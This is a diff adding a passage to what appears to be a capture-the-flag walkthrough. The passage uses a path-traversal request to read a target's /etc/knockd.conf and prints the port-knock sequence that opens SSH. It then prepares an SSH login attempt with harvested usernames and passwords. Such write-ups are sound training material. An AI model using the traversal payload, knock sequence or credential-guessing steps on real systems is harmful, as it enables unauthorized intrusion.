@@ -99,6 +99,27 @@ for row in csv_reader:
                 f_password.write(password + "\n")
 ```
 
+The target is block SSH port. So I find the way to cause it allows to connect to my exploit machine. I got this: https://www.unixmen.com/knockd-detailed-simpler/
+
+Check the `knocd.conf` on uri `/manage.php?file=../../../../../etc/knockd.conf`:  
+
+```
+[options]
+	UseSyslog
+
+[openSSH]
+	sequence    = 7469,8475,9842
+	seq_timeout = 25
+	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+	tcpflags    = syn
+
+[closeSSH]
+	sequence    = 9842,8475,7469
+	seq_timeout = 25
+	command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+	tcpflags    = syn
+```
+
 Using `usernames.txt` and `password.txt` to try logging to target via ssh:
 
 ```sh
